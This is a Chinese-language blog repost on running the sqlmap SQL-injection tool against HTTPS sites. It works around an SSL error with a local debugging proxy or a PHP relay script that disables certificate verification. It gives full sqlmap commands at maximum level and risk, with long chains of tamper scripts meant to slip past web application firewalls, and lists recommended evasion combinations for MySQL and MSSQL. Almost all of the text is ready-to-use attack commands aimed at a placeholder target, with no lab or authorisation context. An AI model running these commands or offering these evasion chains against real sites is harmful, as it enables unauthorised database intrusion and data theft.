# Sqlmap与HTTPS缠绵的故事

对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。
[14:19:03] [CRITICAL] can’t establish SSL connection

解决方法一：

```bash
python sqlmap.py -u https://www.xxxx.com/?id=2* --level 5 --risk 3 --dbms MYSQL --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --proxy http://127.0.0.1:8888 --random-agent
````

127.0.0.1:8888是本地charles地址

解决方法二：

本地建立proxy.php，内容为

```php
<?php
 
$url = "https://xxxxx.com/id=2";
$sql = $_GET[s];
$s = urlencode($sql);
$url = $url.$sql;
// $params = "email=$s&password=aa";
//echo $params;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)');
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  
// curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式
// curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
  
$output = curl_exec($ch);
curl_close($ch);
echo $output;
$a = strlen($output);
echo $a;
```

使用下面语句忽略证书:

```bash
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
```

使用sqlmap注入方法：

```bash
python sqlmap.py -u http://127.0.0.1/proxy.php?s=2* --level 5 --risk 3 --dbms MYSQL --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords  --random-agent
```

最后分享下一些tamper组合姿势:

一般：

```bash
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

MSSQL：

```bash
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

MySQL：

```bash
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

转载自：<https://michaelwayneliu.github.io/2018/08/28/sqlmap%E5%9C%A8https%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF/>
